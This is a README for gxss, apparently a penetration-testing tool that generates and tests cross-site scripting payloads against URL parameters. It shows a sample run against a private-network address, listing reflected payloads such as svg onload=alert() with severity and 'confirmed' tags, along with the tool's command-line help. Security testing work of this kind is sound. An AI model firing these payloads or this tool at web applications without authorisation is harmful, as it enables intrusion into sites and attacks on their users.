# gxss
Generate and test XSS payloads given injection points

```
$ echo http://192.168.1.108:9999/home | url-miner -w testwords -json | gxss -s
[low] http://192.168.1.108:9999/home?q=<xss zzxqyj=x>
[medium] http://192.168.1.108:9999/home?q=<xss onfocus=zzxqyj>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert()>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert(x)>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert(1)>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=prompt()>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=prompt``>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert``>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=alert`x`>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=javascript:alert()>
[high] http://192.168.1.108:9999/home?q=<xss onfocus=javascript:alert``>
[low] http://192.168.1.108:9999/home?q=<svg zzxqyj=x>
[medium] http://192.168.1.108:9999/home?q=<svg onload=zzxqyj>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert()%3E
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert()%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=alert()>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert(x)%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=alert(x)>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert(1)%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=alert(1)>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt()%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=prompt()>
[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt``%3E
[high] http://192.168.1.108:9999/home?q=<svg onload=prompt``>
...
```

# Help
```
$ gxss -h
Usage of gxss:
  -debug
    	Display errors.
  -debug-chrome
    	Don't use headless. (slow but fun to watch)
  -p string
    	YAML file of escape patterns and xss payloads. (default "./payloads.yaml")
  -proxy string
    	Proxy URL. Example: -proxy http://127.0.0.1:8080
  -s	Show result type.
  -sev int
    	Filter by severity. 1 is a confirmed alert, 2-4 are high-low. (default 4)
  -stop
    	Stop on first confirmed xss.
  -t int
    	Number of threads to use. (default 8)
  -wait int
    	Seconds to wait on page after loading in chrome mode. (Use to wait for AJAX reqs)
      ```
